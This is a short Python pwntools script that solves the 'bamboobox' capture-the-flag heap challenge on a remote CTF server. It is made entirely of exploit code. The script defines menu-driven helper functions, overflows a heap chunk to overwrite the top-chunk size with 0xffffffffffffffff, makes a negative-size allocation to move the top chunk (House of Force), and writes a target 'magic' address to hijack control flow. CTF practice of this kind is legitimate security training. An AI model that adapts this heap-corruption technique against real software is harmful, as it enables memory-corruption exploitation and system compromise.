#!/usr/bin/env python

from pwn import *

r = remote("bamboofox.cs.nctu.edu.tw", 11005)
# r = process('./bamboobox')

context.arch = 'amd64'

def show():
    r.sendafter(':', '1')

def add(length, name):
    r.sendafter(':', '2')
    r.sendafter(':', str(length))
    r.sendafter(':', name)

def change(idx, length, name):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))
    r.sendafter(':', str(length))
    r.sendafter(':', name)

def remove(idx):
    r.sendafter(':', '4')
    r.sendafter(':', str(idx))

add(0x80, 'a') # 0
add(0x80, 'a') # 1
change(1, 0x100, 'a' * 0x88 + p64(0xffffffffffffffff))
add(-336, 'a')

magic = 0x000000000400de9

add(0x10, flat([0, magic]))
r.sendline('5')

r.interactive()
